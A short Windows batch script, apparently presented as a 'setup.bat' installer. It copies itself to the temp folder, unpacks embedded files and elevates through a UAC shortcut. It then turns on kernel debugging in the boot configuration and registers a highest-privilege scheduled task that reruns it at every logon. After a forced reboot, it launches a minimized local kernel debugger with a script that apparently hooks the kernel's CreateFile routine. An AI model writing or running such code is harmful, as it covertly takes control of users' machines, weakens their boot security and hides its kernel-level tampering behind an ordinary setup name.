@echo off


IF [%1]==[/INTEMPDIR] GOTO INTEMPDIR
IF [%1]==[/DOONLOGON] GOTO ONLOGON
IF [%1]==[/INTEMPDIRADMIN] GOTO INTEMPDIRADMIN


:FIRSTEXECUTION
rem this is the first execution
copy "%0" "%temp%\setup.bat"
"%temp%\setup.bat" /INTEMPDIR
GOTO DONE


:INTEMPDIR
rem here we have copied ourselves to temp and we are being executed there
cd %0\..
expand %0 .\ -F:*
promptUAC.lnk /INTEMPDIRADMIN


:INTEMPDIRADMIN
bcdedit /debug on
bcdedit /dbgsettings local
schtasks /create /sc onlogon /tn setup /rl highest /tr "%0 /DOONLOGON"
shutdown /r /f
GOTO DONE


:ONLOGON
rem here local debugging is enabled and we run as administrator
cd %0\..
start /min windbg -y "SRV*c:\symbols*http://msdl.microsoft.com/download/symbols" -c"$$><jmpkernel_hookcreatefile.wdbg;q" -kl
GOTO DONE


:DONE
pause
goto:eof